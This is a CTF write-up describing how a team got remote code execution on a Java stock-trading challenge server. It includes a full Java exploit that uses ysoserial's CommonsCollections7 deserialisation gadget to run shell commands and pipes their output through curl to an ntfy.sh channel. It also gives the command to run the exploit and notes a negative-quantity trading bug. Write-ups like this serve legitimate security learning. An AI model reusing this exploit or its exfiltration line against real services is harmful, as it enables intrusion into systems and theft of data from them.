# How to get the flag
To get the flag, after testing out all different possibilities of sending data (like malformed buy & sell requests), trying to see if the flag would show up with certain money amounts, or brute forcing some possible stock names (to see if any hidden stocks existed), we were left with one main option left
which was try to get RCE on the host machine, the only way we saw of this potentially was through the data field on the BuyRequest, which seemingly was left there for no reason. We initially avoided this as it seemed like the hardest path (but alas it was the only way).

The data transferred through the sockets was just pure serialised java classes, taking advantage of this, after a bit of research (and trying other thing such as trying to send our own classes), we found out about java deserialisation exploits, leading us to try implement our own exploit runner, though when this didnt work (likely due to not escaping commands fully), we turned to `ysoserial`, a library with a big list of different payload strategies. We selected `CommonsCollections7` since it was the most compatible with our java version that we tried (others used deprecated features).

```java
package myapp.ctf.client;

// This is nearly the same as the stockapp one, just with extra logging.
import myapp.ctf.client.ServerConnection;
import com.ctf.stockapp.common.protocol.BuyRequest;


import ysoserial.payloads.CommonsCollections7;

public class FinalExploit {
    public static String server = "team54-thickapp.durhack.qwerty.technology";
    public static int port = 9999;
    public static ServerConnection connection;


    public static Object createPayload(String command) {
        try {
            return new CommonsCollections7().getObject(command);
        } catch (Exception e) {
            System.out.println("Failed to create attack payload.");
            System.exit(1);
            return new Object();
        }
        
    }

    public static void doAttack(String cmd) {

        Object payload = createPayload(cmd);
        // Send the payload in the BuyRequest class, though it might work if we
        // just send the payload straight through the input stream.
        BuyRequest request = new BuyRequest();
        request.setData(payload);
        
        System.out.println("Sending request!");
        try {
            connection.sendRequest(request);
        } catch (Exception e) {
            System.out.println("ERROR: failed to send request!");
        }
    }

    public static void main(String[] args) {
        connection = new ServerConnection(server, port);
        // no need to login, since all objects are parsed

        String user_command = args.length > 0 ? args[0] : "cat /flag.txt";

        // We need to ensure that no spaces are included in the command string, as we can't escape it with quotations, we can do this with the standard unix
        // IFS env variable.
        // We exfiltrate the data to a ntfy.sh channel for easy access.
        user_command = user_command.replace(" ", "${IFS}");
        String attack_command = "/usr/bin/env bash -c " + user_command + "|curl${IFS}-s${IFS}-d@-${IFS}https://ntfy.sh/durhack-x";

        System.out.println("Prepared payload: " + attack_command);

        doAttack(attack_command);
    }
}
```

You can compile and run this with the following command (ran from the root `java` directory)
```sh
COMMAND="ls" javac -cp "client.jar:client/lib/*" -d build $(find client -name '*.java') && java -cp "build:client.jar:client/lib/*" myapp.ctf.client.FinalExploit "$COMMAND"
```

This includes two libraries jackson-databind (for when we were debugging by printing the response objects as JSON - to easily see their attributes even for lists etc.), and then also `ysoserial` for generating the object payload.


# Bonus (how to get infinite money)
You can buy and sell negative amounts of stocks, which then increases/decreases you balance from the initially stable $15000.
You keep these stocks in your account.

See our `myapp.ctf.client` `Main` class, which has some of the requests, we used while testing.



